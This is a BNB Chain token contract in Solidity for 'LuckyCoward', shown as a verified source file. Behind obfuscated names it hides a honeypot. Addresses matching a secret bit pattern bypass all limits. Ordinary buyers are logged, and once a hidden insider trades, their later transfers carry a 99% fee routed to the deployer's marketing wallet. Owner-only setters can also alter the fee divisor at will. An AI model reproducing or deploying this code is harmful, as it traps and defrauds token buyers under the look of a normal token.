/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract LuckyCoward is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Lucky Coward ";
    string constant _symbol = "LuckyCoward";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private sellLiquidityExemptWallet;
    mapping(address => bool) private isTxTradingBuy;
    mapping(address => bool) private maxSwapAutoIs;
    mapping(address => bool) private modeAutoFeeMin;
    mapping(address => uint256) private limitLiquidityExemptReceiver;
    mapping(uint256 => address) private walletLaunchedMarketingTeam;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private autoFeeBotsBuy = 0;
    uint256 private maxLimitModeSellTradingAutoBuy = 7;

    //SELL FEES
    uint256 private modeSellLiquidityMarketing = 0;
    uint256 private modeBuyReceiverMarketingSwap = 7;

    uint256 private maxSellWalletModeAuto = maxLimitModeSellTradingAutoBuy + autoFeeBotsBuy;
    uint256 private swapMarketingLiquidityIs = 100;

    address private botsTradingAutoIsLimit = (msg.sender); // auto-liq address
    address private isExemptReceiverMin = (0xd9BeF9E217642106AD3a0623FFFfdcB8F8b7837F); // marketing address
    address private marketingMaxModeTrading = DEAD;
    address private botsAutoBuyMarketing = DEAD;
    address private feeSellMaxLaunched = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingBuyFeeLiquidity;
    uint256 private liquidityIsExemptMax;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyLaunchedReceiverLiquidityTradingModeMarketing;
    uint256 private walletMinSellLaunched;
    uint256 private marketingIsLimitMax;
    uint256 private swapMinIsLaunched;
    uint256 private autoTeamLimitMaxMarketing;

    bool private txBurnTradingFeeBots = true;
    bool private modeAutoFeeMinMode = true;
    bool private exemptBotsMarketingBuy = true;
    bool private modeTxTeamIsSwapBuyBurn = true;
    bool private feeMinBurnSwapExempt = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private sellLimitMaxLaunchedMarketingAuto = _totalSupply / 1000; // 0.1%

    
    bool private sellLimitTradingBuyBurnMax;
    bool private receiverLaunchedMarketingFee;
    uint256 private exemptLimitFeeBurnReceiver;
    uint256 private minExemptBotsBurn;
    bool private autoLimitLiquidityLaunched;
    bool private receiverIsBotsMax;
    bool private limitLiquidityAutoIs;
    bool private marketingBotsLimitAutoExempt;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyLaunchedReceiverLiquidityTradingModeMarketing = true;

        sellLiquidityExemptWallet[msg.sender] = true;
        sellLiquidityExemptWallet[address(this)] = true;

        isTxTradingBuy[msg.sender] = true;
        isTxTradingBuy[0x0000000000000000000000000000000000000000] = true;
        isTxTradingBuy[0x000000000000000000000000000000000000dEaD] = true;
        isTxTradingBuy[address(this)] = true;

        maxSwapAutoIs[msg.sender] = true;
        maxSwapAutoIs[0x0000000000000000000000000000000000000000] = true;
        maxSwapAutoIs[0x000000000000000000000000000000000000dEaD] = true;
        maxSwapAutoIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitExemptLiquidityTrading(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitExemptLiquidityTrading(sender, recipient, amount);
    }

    function limitExemptLiquidityTrading(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = teamLiquiditySwapReceiver(sender) || teamLiquiditySwapReceiver(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxLimitTeamWallet();
            }
            if (!bLimitTxWalletValue) {
                receiverBuyIsLimit(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return exemptReceiverModeBuySwap(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(txBurnTradingFeeBots, "Trading is not active");
        }

        if (!Administration[sender] && !sellLiquidityExemptWallet[sender] && !sellLiquidityExemptWallet[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || maxSwapAutoIs[sender] || maxSwapAutoIs[recipient], "Max TX Limit has been triggered");

        if (exemptTeamSellWallet()) {maxTxWalletTrading();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = liquidityBurnTradingBotsMode(sender) ? autoLimitMarketingBotsMaxMinLaunched(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptReceiverModeBuySwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function liquidityBurnTradingBotsMode(address sender) internal view returns (bool) {
        return !isTxTradingBuy[sender];
    }

    function launchedTeamExemptTx(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            maxSellWalletModeAuto = modeBuyReceiverMarketingSwap + modeSellLiquidityMarketing;
            return tradingBotsSellAuto(sender, maxSellWalletModeAuto);
        }
        if (!selling && sender == uniswapV2Pair) {
            maxSellWalletModeAuto = maxLimitModeSellTradingAutoBuy + autoFeeBotsBuy;
            return maxSellWalletModeAuto;
        }
        return tradingBotsSellAuto(sender, maxSellWalletModeAuto);
    }

    function autoLimitMarketingBotsMaxMinLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(launchedTeamExemptTx(sender, receiver == uniswapV2Pair)).div(swapMarketingLiquidityIs);

        if (modeAutoFeeMin[sender] || modeAutoFeeMin[receiver]) {
            feeAmount = amount.mul(99).div(swapMarketingLiquidityIs);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function teamLiquiditySwapReceiver(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function tradingBotsSellAuto(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = limitLiquidityExemptReceiver[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverBuyIsLimit(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        walletLaunchedMarketingTeam[exemptLimitValue] = addr;
    }

    function maxLimitTeamWallet() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (limitLiquidityExemptReceiver[walletLaunchedMarketingTeam[i]] == 0) {
                    limitLiquidityExemptReceiver[walletLaunchedMarketingTeam[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(isExemptReceiverMin).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptTeamSellWallet() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    feeMinBurnSwapExempt &&
    _balances[address(this)] >= sellLimitMaxLaunchedMarketingAuto;
    }

    function maxTxWalletTrading() internal swapping {
        uint256 amountToLiquify = sellLimitMaxLaunchedMarketingAuto.mul(autoFeeBotsBuy).div(maxSellWalletModeAuto).div(2);
        uint256 amountToSwap = sellLimitMaxLaunchedMarketingAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = maxSellWalletModeAuto.sub(autoFeeBotsBuy.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(autoFeeBotsBuy).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(maxLimitModeSellTradingAutoBuy).div(totalETHFee);

        payable(isExemptReceiverMin).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsTradingAutoIsLimit,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapMarketingLiquidityIs() public view returns (uint256) {
        if (swapMarketingLiquidityIs == modeSellLiquidityMarketing) {
            return modeSellLiquidityMarketing;
        }
        if (swapMarketingLiquidityIs == sellLimitMaxLaunchedMarketingAuto) {
            return sellLimitMaxLaunchedMarketingAuto;
        }
        return swapMarketingLiquidityIs;
    }
    function setSwapMarketingLiquidityIs(uint256 a0) public onlyOwner {
        swapMarketingLiquidityIs=a0;
    }

    function getIsExemptReceiverMin() public view returns (address) {
        if (isExemptReceiverMin == marketingMaxModeTrading) {
            return marketingMaxModeTrading;
        }
        if (isExemptReceiverMin == feeSellMaxLaunched) {
            return feeSellMaxLaunched;
        }
        if (isExemptReceiverMin == marketingMaxModeTrading) {
            return marketingMaxModeTrading;
        }
        return isExemptReceiverMin;
    }
    function setIsExemptReceiverMin(address a0) public onlyOwner {
        if (isExemptReceiverMin != botsAutoBuyMarketing) {
            botsAutoBuyMarketing=a0;
        }
        isExemptReceiverMin=a0;
    }

    function getModeSellLiquidityMarketing() public view returns (uint256) {
        if (modeSellLiquidityMarketing != swapMarketingLiquidityIs) {
            return swapMarketingLiquidityIs;
        }
        if (modeSellLiquidityMarketing == autoFeeBotsBuy) {
            return autoFeeBotsBuy;
        }
        if (modeSellLiquidityMarketing != maxSellWalletModeAuto) {
            return maxSellWalletModeAuto;
        }
        return modeSellLiquidityMarketing;
    }
    function setModeSellLiquidityMarketing(uint256 a0) public onlyOwner {
        if (modeSellLiquidityMarketing == modeSellLiquidityMarketing) {
            modeSellLiquidityMarketing=a0;
        }
        if (modeSellLiquidityMarketing != modeSellLiquidityMarketing) {
            modeSellLiquidityMarketing=a0;
        }
        if (modeSellLiquidityMarketing == swapMarketingLiquidityIs) {
            swapMarketingLiquidityIs=a0;
        }
        modeSellLiquidityMarketing=a0;
    }

    function getIsTxTradingBuy(address a0) public view returns (bool) {
            return isTxTradingBuy[a0];
    }
    function setIsTxTradingBuy(address a0,bool a1) public onlyOwner {
        if (a0 == botsAutoBuyMarketing) {
            modeTxTeamIsSwapBuyBurn=a1;
        }
        if (isTxTradingBuy[a0] == sellLiquidityExemptWallet[a0]) {
           sellLiquidityExemptWallet[a0]=a1;
        }
        if (a0 == botsAutoBuyMarketing) {
            feeMinBurnSwapExempt=a1;
        }
        isTxTradingBuy[a0]=a1;
    }

    function getBotsAutoBuyMarketing() public view returns (address) {
        if (botsAutoBuyMarketing != botsTradingAutoIsLimit) {
            return botsTradingAutoIsLimit;
        }
        return botsAutoBuyMarketing;
    }
    function setBotsAutoBuyMarketing(address a0) public onlyOwner {
        if (botsAutoBuyMarketing == feeSellMaxLaunched) {
            feeSellMaxLaunched=a0;
        }
        if (botsAutoBuyMarketing != feeSellMaxLaunched) {
            feeSellMaxLaunched=a0;
        }
        botsAutoBuyMarketing=a0;
    }

    function getBotsTradingAutoIsLimit() public view returns (address) {
        if (botsTradingAutoIsLimit != marketingMaxModeTrading) {
            return marketingMaxModeTrading;
        }
        if (botsTradingAutoIsLimit == botsTradingAutoIsLimit) {
            return botsTradingAutoIsLimit;
        }
        return botsTradingAutoIsLimit;
    }
    function setBotsTradingAutoIsLimit(address a0) public onlyOwner {
        if (botsTradingAutoIsLimit == marketingMaxModeTrading) {
            marketingMaxModeTrading=a0;
        }
        if (botsTradingAutoIsLimit == botsTradingAutoIsLimit) {
            botsTradingAutoIsLimit=a0;
        }
        if (botsTradingAutoIsLimit == marketingMaxModeTrading) {
            marketingMaxModeTrading=a0;
        }
        botsTradingAutoIsLimit=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}